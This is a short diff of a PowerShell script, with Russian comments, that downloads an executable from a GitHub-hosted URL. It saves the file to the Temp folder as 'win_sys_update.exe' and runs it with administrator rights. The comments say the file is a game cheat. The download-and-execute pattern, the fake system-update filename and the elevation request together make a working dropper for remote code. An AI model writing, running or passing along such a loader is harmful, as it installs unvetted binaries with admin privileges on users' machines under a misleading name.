@@ -1,8 +1,8 @@
-$url = "https://github.com"
+$url = "https://githubusercontent.com"
 $path = "$env:LOCALAPPDATA\Temp\win_sys_update.exe"
 
-# Скачивание файла
+# Скачивание чита напрямую из вашего репозитория
 Invoke-WebRequest -Uri $url -OutFile $path
 
-# Запуск от имени администратора
+# Запуск файла от имени администратора
 Start-Process -FilePath $path -Verb RunAs
